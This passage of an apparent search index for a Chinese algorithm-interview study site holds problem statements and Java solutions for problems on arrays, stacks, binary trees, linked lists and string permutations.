public ArrayList<Integer> printMatrix(int[][] matrix) { ArrayList<Integer> ret = new ArrayList<>(); int r1 = 0, r2 = matrix.length - 1, c1 = 0, c2 = matrix[0].length - 1; while (r1 <= r2 && c1 <= c2) { // \u4E0A for (int i = c1; i <= c2; i++) ret.add(matrix[r1][i]); // \u53F3 for (int i = r1 + 1; i <= r2; i++) ret.add(matrix[i][c2]); if (r1 != r2) // \u4E0B for (int i = c2 - 1; i >= c1; i--) ret.add(matrix[r2][i]); if (c1 != c2) // \u5DE6 for (int i = r2 - 1; i > r1; i--) ret.add(matrix[i][c1]); r1++; r2--; c1++; c2--; } return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/3.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97.html",title:"3. \u6570\u7EC4\u4E2D\u91CD\u590D\u7684\u6570\u5B57",pathLocale:"/",contents:[{header:"3. \u6570\u7EC4\u4E2D\u91CD\u590D\u7684\u6570\u5B57",slug:"_3-\u6570\u7EC4\u4E2D\u91CD\u590D\u7684\u6570\u5B57",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5728\u4E00\u4E2A\u957F\u5EA6\u4E3A n \u7684\u6570\u7EC4\u91CC\u7684\u6240\u6709\u6570\u5B57\u90FD\u5728 0 \u5230 n-1 \u7684\u8303\u56F4\u5185\u3002\u6570\u7EC4\u4E2D\u67D0\u4E9B\u6570\u5B57\u662F\u91CD\u590D\u7684\uFF0C\u4F46\u4E0D\u77E5\u9053\u6709\u51E0\u4E2A\u6570\u5B57\u662F\u91CD\u590D\u7684\uFF0C\u4E5F\u4E0D\u77E5\u9053\u6BCF\u4E2A\u6570\u5B57\u91CD\u590D\u51E0\u6B21\u3002\u8BF7\u627E\u51FA\u6570\u7EC4\u4E2D\u4EFB\u610F\u4E00\u4E2A\u91CD\u590D\u7684\u6570\u5B57\u3002
Input:
{2, 3, 1, 0, 2, 5} Output:
2`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u8981\u6C42\u65F6\u95F4\u590D\u6742\u5EA6 O(N)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6 O(1)\u3002\u56E0\u6B64\u4E0D\u80FD\u4F7F\u7528\u6392\u5E8F\u7684\u65B9\u6CD5\uFF0C\u4E5F\u4E0D\u80FD\u4F7F\u7528\u989D\u5916\u7684\u6807\u8BB0\u6570\u7EC4\u3002
\u5BF9\u4E8E\u8FD9\u79CD\u6570\u7EC4\u5143\u7D20\u5728 [0, n-1] \u8303\u56F4\u5185\u7684\u95EE\u9898\uFF0C\u53EF\u4EE5\u5C06\u503C\u4E3A i \u7684\u5143\u7D20\u8C03\u6574\u5230\u7B2C i \u4E2A\u4F4D\u7F6E\u4E0A\u8FDB\u884C\u6C42\u89E3\u3002\u5728\u8C03\u6574\u8FC7\u7A0B\u4E2D\uFF0C\u5982\u679C\u7B2C i \u4F4D\u7F6E\u4E0A\u5DF2\u7ECF\u6709\u4E00\u4E2A\u503C\u4E3A i \u7684\u5143\u7D20\uFF0C\u5C31\u53EF\u4EE5\u77E5\u9053 i \u503C\u91CD\u590D\u3002
\u4EE5 (2, 3, 1, 0, 2, 5) \u4E3A\u4F8B\uFF0C\u904D\u5386\u5230\u4F4D\u7F6E 4 \u65F6\uFF0C\u8BE5\u4F4D\u7F6E\u4E0A\u7684\u6570\u4E3A 2\uFF0C\u4F46\u662F\u7B2C 2 \u4E2A\u4F4D\u7F6E\u4E0A\u5DF2\u7ECF\u6709\u4E00\u4E2A 2 \u7684\u503C\u4E86\uFF0C\u56E0\u6B64\u53EF\u4EE5\u77E5\u9053 2 \u91CD\u590D\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/643b6f18-f933-4ac5-aa7a-e304dbd7fe49.gif" width="350px">
public int duplicate(int[] nums) { for (int i = 0; i < nums.length; i++) { while (nums[i] != i) { if (nums[i] == nums[nums[i]]) { return nums[i]; } swap(nums, i, nums[i]); } swap(nums, i, nums[i]); } return -1;
} private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/30.%20%E5%8C%85%E5%90%AB%20min%20%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88.html",title:"30. \u5305\u542B min \u51FD\u6570\u7684\u6808",pathLocale:"/",contents:[{header:"30. \u5305\u542B min \u51FD\u6570\u7684\u6808",slug:"_30-\u5305\u542B-min-\u51FD\u6570\u7684\u6808",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u5B9E\u73B0\u4E00\u4E2A\u5305\u542B min() \u51FD\u6570\u7684\u6808\uFF0C\u8BE5\u65B9\u6CD5\u8FD4\u56DE\u5F53\u524D\u6808\u4E2D\u6700\u5C0F\u7684\u503C\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u4E00\u4E2A\u989D\u5916\u7684 minStack\uFF0C\u6808\u9876\u5143\u7D20\u4E3A\u5F53\u524D\u6808\u4E2D\u6700\u5C0F\u7684\u503C\u3002\u5728\u5BF9\u6808\u8FDB\u884C push \u5165\u6808\u548C pop \u51FA\u6808\u64CD\u4F5C\u65F6\uFF0C\u540C\u6837\u9700\u8981\u5BF9 minStack \u8FDB\u884C\u5165\u6808\u51FA\u6808\u64CD\u4F5C\uFF0C\u4ECE\u800C\u4F7F minStack \u6808\u9876\u5143\u7D20\u4E00\u76F4\u4E3A\u5F53\u524D\u6808\u4E2D\u6700\u5C0F\u7684\u503C\u3002\u5728\u8FDB\u884C push \u64CD\u4F5C\u65F6\uFF0C\u9700\u8981\u6BD4\u8F83\u5165\u6808\u5143\u7D20\u548C\u5F53\u524D\u6808\u4E2D\u6700\u5C0F\u503C\uFF0C\u5C06\u503C\u8F83\u5C0F\u7684\u5143\u7D20 push \u5230 minStack \u4E2D\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104013936126.png" width="350px">
private Stack<Integer> dataStack = new Stack<>();
private Stack<Integer> minStack = new Stack<>(); public void push(int node) { dataStack.push(node); minStack.push(minStack.isEmpty() ? node : Math.min(minStack.peek(), node));
} public void pop() { dataStack.pop(); minStack.pop();
} public int top() { return dataStack.peek();
} public int min() { return minStack.peek();
}`}]},{path:"/%E9%A2%98%E8%A7%A3/31.%20%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E3%80%81%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97.html",title:"31. \u6808\u7684\u538B\u5165\u3001\u5F39\u51FA\u5E8F\u5217",pathLocale:"/",contents:[{header:"31. \u6808\u7684\u538B\u5165\u3001\u5F39\u51FA\u5E8F\u5217",slug:"_31-\u6808\u7684\u538B\u5165\u3001\u5F39\u51FA\u5E8F\u5217",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u8F93\u5165\u4E24\u4E2A\u6574\u6570\u5E8F\u5217\uFF0C\u7B2C\u4E00\u4E2A\u5E8F\u5217\u8868\u793A\u6808\u7684\u538B\u5165\u987A\u5E8F\uFF0C\u8BF7\u5224\u65AD\u7B2C\u4E8C\u4E2A\u5E8F\u5217\u662F\u5426\u4E3A\u8BE5\u6808\u7684\u5F39\u51FA\u987A\u5E8F\u3002\u5047\u8BBE\u538B\u5165\u6808\u7684\u6240\u6709\u6570\u5B57\u5747\u4E0D\u76F8\u7B49\u3002
\u4F8B\u5982\u5E8F\u5217 1,2,3,4,5 \u662F\u67D0\u6808\u7684\u538B\u5165\u987A\u5E8F\uFF0C\u5E8F\u5217 4,5,3,2,1 \u662F\u8BE5\u538B\u6808\u5E8F\u5217\u5BF9\u5E94\u7684\u4E00\u4E2A\u5F39\u51FA\u5E8F\u5217\uFF0C\u4F46 4,3,5,1,2 \u5C31\u4E0D\u53EF\u80FD\u662F\u8BE5\u538B\u6808\u5E8F\u5217\u7684\u5F39\u51FA\u5E8F\u5217\u3002`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u4E00\u4E2A\u6808\u6765\u6A21\u62DF\u538B\u5165\u5F39\u51FA\u64CD\u4F5C\u3002\u6BCF\u6B21\u5165\u6808\u4E00\u4E2A\u5143\u7D20\u540E\uFF0C\u90FD\u8981\u5224\u65AD\u4E00\u4E0B\u6808\u9876\u5143\u7D20\u662F\u4E0D\u662F\u5F53\u524D\u51FA\u6808\u5E8F\u5217 popSequence \u7684\u7B2C\u4E00\u4E2A\u5143\u7D20\uFF0C\u5982\u679C\u662F\u7684\u8BDD\u5219\u6267\u884C\u51FA\u6808\u64CD\u4F5C\u5E76\u5C06 popSequence \u5F80\u540E\u79FB\u4E00\u4F4D\uFF0C\u7EE7\u7EED\u8FDB\u884C\u5224\u65AD\u3002
public boolean IsPopOrder(int[] pushSequence, int[] popSequence) { int n = pushSequence.length; Stack<Integer> stack = new Stack<>(); for (int pushIndex = 0, popIndex = 0; pushIndex < n; pushIndex++) { stack.push(pushSequence[pushIndex]); while (popIndex < n && !stack.isEmpty() && stack.peek() == popSequence[popIndex]) { stack.pop(); popIndex++; } } return stack.isEmpty();
}`}]},{path:"/%E9%A2%98%E8%A7%A3/32.1%20%E4%BB%8E%E4%B8%8A%E5%BE%80%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91.html",title:"32.1 \u4ECE\u4E0A\u5F80\u4E0B\u6253\u5370\u4E8C\u53C9\u6811",pathLocale:"/",contents:[{header:"32.1 \u4ECE\u4E0A\u5F80\u4E0B\u6253\u5370\u4E8C\u53C9\u6811",slug:"_32-1-\u4ECE\u4E0A\u5F80\u4E0B\u6253\u5370\u4E8C\u53C9\u6811",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u4ECE\u4E0A\u5F80\u4E0B\u6253\u5370\u51FA\u4E8C\u53C9\u6811\u7684\u6BCF\u4E2A\u8282\u70B9\uFF0C\u540C\u5C42\u8282\u70B9\u4ECE\u5DE6\u81F3\u53F3\u6253\u5370\u3002
\u4F8B\u5982\uFF0C\u4EE5\u4E0B\u4E8C\u53C9\u6811\u5C42\u6B21\u904D\u5386\u7684\u7ED3\u679C\u4E3A\uFF1A1,2,3,4,5,6,7
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d5e838cf-d8a2-49af-90df-1b2a714ee676.jpg" width="250)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u961F\u5217\u6765\u8FDB\u884C\u5C42\u6B21\u904D\u5386\u3002
\u4E0D\u9700\u8981\u4F7F\u7528\u4E24\u4E2A\u961F\u5217\u5206\u522B\u5B58\u50A8\u5F53\u524D\u5C42\u7684\u8282\u70B9\u548C\u4E0B\u4E00\u5C42\u7684\u8282\u70B9\uFF0C\u56E0\u4E3A\u5728\u5F00\u59CB\u904D\u5386\u4E00\u5C42\u7684\u8282\u70B9\u65F6\uFF0C\u5F53\u524D\u961F\u5217\u4E2D\u7684\u8282\u70B9\u6570\u5C31\u662F\u5F53\u524D\u5C42\u7684\u8282\u70B9\u6570\uFF0C\u53EA\u8981\u63A7\u5236\u904D\u5386\u8FD9\u4E48\u591A\u8282\u70B9\u6570\uFF0C\u5C31\u80FD\u4FDD\u8BC1\u8FD9\u6B21\u904D\u5386\u7684\u90FD\u662F\u5F53\u524D\u5C42\u7684\u8282\u70B9\u3002
public ArrayList<Integer> PrintFromTopToBottom(TreeNode root) { Queue<TreeNode> queue = new LinkedList<>(); ArrayList<Integer> ret = new ArrayList<>(); queue.add(root); while (!queue.isEmpty()) { int cnt = queue.size(); while (cnt-- > 0) { TreeNode t = queue.poll(); if (t == null) continue; ret.add(t.val); queue.add(t.left); queue.add(t.right); } } return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/32.2%20%E6%8A%8A%E4%BA%8C%E5%8F%89%E6%A0%91%E6%89%93%E5%8D%B0%E6%88%90%E5%A4%9A%E8%A1%8C.html",title:"32.2 \u628A\u4E8C\u53C9\u6811\u6253\u5370\u6210\u591A\u884C",pathLocale:"/",contents:[{header:"32.2 \u628A\u4E8C\u53C9\u6811\u6253\u5370\u6210\u591A\u884C",slug:"_32-2-\u628A\u4E8C\u53C9\u6811\u6253\u5370\u6210\u591A\u884C",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u548C\u4E0A\u9898\u51E0\u4E4E\u4E00\u6837\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`ArrayList<ArrayList<Integer>> Print(TreeNode pRoot) { ArrayList<ArrayList<Integer>> ret = new ArrayList<>(); Queue<TreeNode> queue = new LinkedList<>(); queue.add(pRoot); while (!queue.isEmpty()) { ArrayList<Integer> list = new ArrayList<>(); int cnt = queue.size(); while (cnt-- > 0) { TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); } if (list.size() != 0) ret.add(list); } return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/32.3%20%E6%8C%89%E4%B9%8B%E5%AD%97%E5%BD%A2%E9%A1%BA%E5%BA%8F%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91.html",title:"32.3 \u6309\u4E4B\u5B57\u5F62\u987A\u5E8F\u6253\u5370\u4E8C\u53C9\u6811",pathLocale:"/",contents:[{header:"32.3 \u6309\u4E4B\u5B57\u5F62\u987A\u5E8F\u6253\u5370\u4E8C\u53C9\u6811",slug:"_32-3-\u6309\u4E4B\u5B57\u5F62\u987A\u5E8F\u6253\u5370\u4E8C\u53C9\u6811",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8BF7\u5B9E\u73B0\u4E00\u4E2A\u51FD\u6570\u6309\u7167\u4E4B\u5B57\u5F62\u6253\u5370\u4E8C\u53C9\u6811\uFF0C\u5373\u7B2C\u4E00\u884C\u6309\u7167\u4ECE\u5DE6\u5230\u53F3\u7684\u987A\u5E8F\u6253\u5370\uFF0C\u7B2C\u4E8C\u5C42\u6309\u7167\u4ECE\u53F3\u81F3\u5DE6\u7684\u987A\u5E8F\u6253\u5370\uFF0C\u7B2C\u4E09\u884C\u6309\u7167\u4ECE\u5DE6\u5230\u53F3\u7684\u987A\u5E8F\u6253\u5370\uFF0C\u5176\u4ED6\u884C\u4EE5\u6B64\u7C7B\u63A8\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public ArrayList<ArrayList<Integer>> Print(TreeNode pRoot) { ArrayList<ArrayList<Integer>> ret = new ArrayList<>(); Queue<TreeNode> queue = new LinkedList<>(); queue.add(pRoot); boolean reverse = false; while (!queue.isEmpty()) { ArrayList<Integer> list = new ArrayList<>(); int cnt = queue.size(); while (cnt-- > 0) { TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); } if (reverse) Collections.reverse(list); reverse = !reverse; if (list.size() != 0) ret.add(list); } return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/33.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97.html",title:"33. \u4E8C\u53C9\u641C\u7D22\u6811\u7684\u540E\u5E8F\u904D\u5386\u5E8F\u5217",pathLocale:"/",contents:[{header:"33. \u4E8C\u53C9\u641C\u7D22\u6811\u7684\u540E\u5E8F\u904D\u5386\u5E8F\u5217",slug:"_33-\u4E8C\u53C9\u641C\u7D22\u6811\u7684\u540E\u5E8F\u904D\u5386\u5E8F\u5217",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u8F93\u5165\u4E00\u4E2A\u6574\u6570\u6570\u7EC4\uFF0C\u5224\u65AD\u8BE5\u6570\u7EC4\u662F\u4E0D\u662F\u67D0\u4E8C\u53C9\u641C\u7D22\u6811\u7684\u540E\u5E8F\u904D\u5386\u7684\u7ED3\u679C\u3002\u5047\u8BBE\u8F93\u5165\u7684\u6570\u7EC4\u7684\u4EFB\u610F\u4E24\u4E2A\u6570\u5B57\u90FD\u4E92\u4E0D\u76F8\u540C\u3002
\u4F8B\u5982\uFF0C\u4E0B\u56FE\u662F\u540E\u5E8F\u904D\u5386\u5E8F\u5217 1,3,2 \u6240\u5BF9\u5E94\u7684\u4E8C\u53C9\u641C\u7D22\u6811\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/13454fa1-23a8-4578-9663-2b13a6af564a.jpg" width="150)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public boolean VerifySquenceOfBST(int[] sequence) { if (sequence == null || sequence.length == 0) return false; return verify(sequence, 0, sequence.length - 1);
} private boolean verify(int[] sequence, int first, int last) { if (last - first <= 1) return true; int rootVal = sequence[last]; int cutIndex = first; while (cutIndex < last && sequence[cutIndex] <= rootVal) cutIndex++; for (int i = cutIndex; i < last; i++) if (sequence[i] < rootVal) return false; return verify(sequence, first, cutIndex - 1) && verify(sequence, cutIndex, last - 1);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/34.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84.html",title:"34. \u4E8C\u53C9\u6811\u4E2D\u548C\u4E3A\u67D0\u4E00\u503C\u7684\u8DEF\u5F84",pathLocale:"/",contents:[{header:"34. \u4E8C\u53C9\u6811\u4E2D\u548C\u4E3A\u67D0\u4E00\u503C\u7684\u8DEF\u5F84",slug:"_34-\u4E8C\u53C9\u6811\u4E2D\u548C\u4E3A\u67D0\u4E00\u503C\u7684\u8DEF\u5F84",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u8F93\u5165\u4E00\u9897\u4E8C\u53C9\u6811\u548C\u4E00\u4E2A\u6574\u6570\uFF0C\u6253\u5370\u51FA\u4E8C\u53C9\u6811\u4E2D\u7ED3\u70B9\u503C\u7684\u548C\u4E3A\u8F93\u5165\u6574\u6570\u7684\u6240\u6709\u8DEF\u5F84\u3002\u8DEF\u5F84\u5B9A\u4E49\u4E3A\u4ECE\u6811\u7684\u6839\u7ED3\u70B9\u5F00\u59CB\u5F80\u4E0B\u4E00\u76F4\u5230\u53F6\u7ED3\u70B9\u6240\u7ECF\u8FC7\u7684\u7ED3\u70B9\u5F62\u6210\u4E00\u6761\u8DEF\u5F84\u3002
\u4E0B\u56FE\u7684\u4E8C\u53C9\u6811\u6709\u4E24\u6761\u548C\u4E3A 22 \u7684\u8DEF\u5F84\uFF1A10, 5, 7 \u548C 10, 12
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ed77b0e6-38d9-4a34-844f-724f3ffa2c12.jpg" width="200)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`private ArrayList<ArrayList<Integer>> ret = new ArrayList<>(); public ArrayList<ArrayList<Integer>> FindPath(TreeNode root, int target) { backtracking(root, target, new ArrayList<>()); return ret;
} private void backtracking(TreeNode node, int target, ArrayList<Integer> path) { if (node == null) return; path.add(node.val); target -= node.val; if (target == 0 && node.left == null && node.right == null) { ret.add(new ArrayList<>(path)); } else { backtracking(node.left, target, path); backtracking(node.right, target, path); } path.remove(path.size() - 1);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/35.%20%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6.html",title:"35. \u590D\u6742\u94FE\u8868\u7684\u590D\u5236",pathLocale:"/",contents:[{header:"35. \u590D\u6742\u94FE\u8868\u7684\u590D\u5236",slug:"_35-\u590D\u6742\u94FE\u8868\u7684\u590D\u5236",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u8F93\u5165\u4E00\u4E2A\u590D\u6742\u94FE\u8868\uFF08\u6BCF\u4E2A\u8282\u70B9\u4E2D\u6709\u8282\u70B9\u503C\uFF0C\u4EE5\u53CA\u4E24\u4E2A\u6307\u9488\uFF0C\u4E00\u4E2A\u6307\u5411\u4E0B\u4E00\u4E2A\u8282\u70B9\uFF0C\u53E6\u4E00\u4E2A\u7279\u6B8A\u6307\u9488\u6307\u5411\u4EFB\u610F\u4E00\u4E2A\u8282\u70B9\uFF09\uFF0C\u8FD4\u56DE\u7ED3\u679C\u4E3A\u590D\u5236\u540E\u590D\u6742\u94FE\u8868\u7684 head\u3002
public class RandomListNode { int label; RandomListNode next = null; RandomListNode random = null; RandomListNode(int label) { this.label = label; }
}
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66a01953-5303-43b1-8646-0c77b825e980.png" width="300)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u7B2C\u4E00\u6B65\uFF0C\u5728\u6BCF\u4E2A\u8282\u70B9\u7684\u540E\u9762\u63D2\u5165\u590D\u5236\u7684\u8282\u70B9\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dfd5d3f8-673c-486b-8ecf-d2082107b67b.png" width="600)
\u7B2C\u4E8C\u6B65\uFF0C\u5BF9\u590D\u5236\u8282\u70B9\u7684 random \u94FE\u63A5\u8FDB\u884C\u8D4B\u503C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cafbfeb8-7dfe-4c0a-a3c9-750eeb824068.png" width="600)
\u7B2C\u4E09\u6B65\uFF0C\u62C6\u5206\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e151b5df-5390-4365-b66e-b130cd253c12.png" width="600)
public RandomListNode Clone(RandomListNode pHead) { if (pHead == null) return null; // \u63D2\u5165\u65B0\u8282\u70B9 RandomListNode cur = pHead; while (cur != null) { RandomListNode clone = new RandomListNode(cur.label); clone.next = cur.next; cur.next = clone; cur = clone.next; } // \u5EFA\u7ACB random \u94FE\u63A5 cur = pHead; while (cur != null) { RandomListNode clone = cur.next; if (cur.random != null) clone.random = cur.random.next; cur = clone.next; } // \u62C6\u5206 cur = pHead; RandomListNode pCloneHead = pHead.next; while (cur.next != null) { RandomListNode next = cur.next; cur.next = next.next; cur = next; } return pCloneHead;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/36.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8.html",title:"36. \u4E8C\u53C9\u641C\u7D22\u6811\u4E0E\u53CC\u5411\u94FE\u8868",pathLocale:"/",contents:[{header:"36. \u4E8C\u53C9\u641C\u7D22\u6811\u4E0E\u53CC\u5411\u94FE\u8868",slug:"_36-\u4E8C\u53C9\u641C\u7D22\u6811\u4E0E\u53CC\u5411\u94FE\u8868",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u8F93\u5165\u4E00\u68F5\u4E8C\u53C9\u641C\u7D22\u6811\uFF0C\u5C06\u8BE5\u4E8C\u53C9\u641C\u7D22\u6811\u8F6C\u6362\u6210\u4E00\u4E2A\u6392\u5E8F\u7684\u53CC\u5411\u94FE\u8868\u3002\u8981\u6C42\u4E0D\u80FD\u521B\u5EFA\u4EFB\u4F55\u65B0\u7684\u7ED3\u70B9\uFF0C\u53EA\u80FD\u8C03\u6574\u6811\u4E2D\u7ED3\u70B9\u6307\u9488\u7684\u6307\u5411\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/05a08f2e-9914-4a77-92ef-aebeaecf4f66.jpg" width="400)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`private TreeNode pre = null;
private TreeNode head = null; public TreeNode Convert(TreeNode root) { inOrder(root); return head;
} private void inOrder(TreeNode node) { if (node == null) return; inOrder(node.left); node.left = pre; if (pre != null) pre.right = node; pre = node; if (head == null) head = node; inOrder(node.right);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/37.%20%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91.html",title:"37. \u5E8F\u5217\u5316\u4E8C\u53C9\u6811",pathLocale:"/",contents:[{header:"37. \u5E8F\u5217\u5316\u4E8C\u53C9\u6811",slug:"_37-\u5E8F\u5217\u5316\u4E8C\u53C9\u6811",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8BF7\u5B9E\u73B0\u4E24\u4E2A\u51FD\u6570\uFF0C\u5206\u522B\u7528\u6765\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u4E8C\u53C9\u6811\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`private String deserializeStr; public String Serialize(TreeNode root) { if (root == null) return "#"; return root.val + " " + Serialize(root.left) + " " + Serialize(root.right);
} public TreeNode Deserialize(String str) { deserializeStr = str; return Deserialize();
} private TreeNode Deserialize() { if (deserializeStr.length() == 0) return null; int index = deserializeStr.indexOf(" "); String node = index == -1 ? deserializeStr : deserializeStr.substring(0, index); deserializeStr = index == -1 ? "" : deserializeStr.substring(index + 1); if (node.equals("#")) return null; int val = Integer.valueOf(node); TreeNode t = new TreeNode(val); t.left = Deserialize(); t.right = Deserialize(); return t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/38.%20%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97.html",title:"38. \u5B57\u7B26\u4E32\u7684\u6392\u5217",pathLocale:"/",contents:[{header:"38. \u5B57\u7B26\u4E32\u7684\u6392\u5217",slug:"_38-\u5B57\u7B26\u4E32\u7684\u6392\u5217",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8F93\u5165\u4E00\u4E2A\u5B57\u7B26\u4E32\uFF0C\u6309\u5B57\u5178\u5E8F\u6253\u5370\u51FA\u8BE5\u5B57\u7B26\u4E32\u4E2D\u5B57\u7B26\u7684\u6240\u6709\u6392\u5217\u3002\u4F8B\u5982\u8F93\u5165\u5B57\u7B26\u4E32 abc\uFF0C\u5219\u6253\u5370\u51FA\u7531\u5B57\u7B26 a, b, c \u6240\u80FD\u6392\u5217\u51FA\u6765\u7684\u6240\u6709\u5B57\u7B26\u4E32 abc, acb, bac, bca, cab \u548C cba\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`private ArrayList<String> ret = new ArrayList<>(); public ArrayList<String> Permutation(String str) { if (str.length() == 0) return ret; char[] chars = str.toCharArray(); Arrays.sort(chars); backtracking(chars, new boolean[chars.length], new StringBuilder()); return ret;
} private void backtracking(char[] chars, boolean[] hasUsed, StringBuilder s) { if (s.length() == chars.length) { ret.add(s.toString()); return; } for (int i = 0; i < chars.length; i++) { if (hasUsed[i]) continue; if (i != 0 && chars[i] == chars[i - 1] && !hasUsed[i - 1]) /* \u4FDD\u8BC1\u4E0D\u91CD\u590D */ continue; hasUsed[i] = true; s.append(chars[i]); backtracking(chars, hasUsed, s); s.deleteCharAt(s.length() - 1); hasUsed[i] = false; }
}`}]},{path:"/%E9%A2%98%E8%A7%A3/39.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97.html",title:"39. \u6570\u7EC4\u4E2D\u51FA\u73B0\u6B21\u6570\u8D85\u8FC7\u4E00\u534A\u7684\u6570\u5B57",pathLocale:"/",contents:[{header:"39. \u6570\u7EC4\u4E2D\u51FA\u73B0\u6B21\u6570\u8D85\u8FC7\u4E00\u534A\u7684\u6570\u5B57",slug:"_39-\u6570\u7EC4\u4E2D\u51FA\u73B0\u6B21\u6570\u8D85\u8FC7\u4E00\u534A\u7684\u6570\u5B57",content:"NowCoder"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u591A\u6570\u6295\u7968\u95EE\u9898\uFF0C\u53EF\u4EE5\u5229\u7528 Boyer-Moore Majority Vote Algorithm 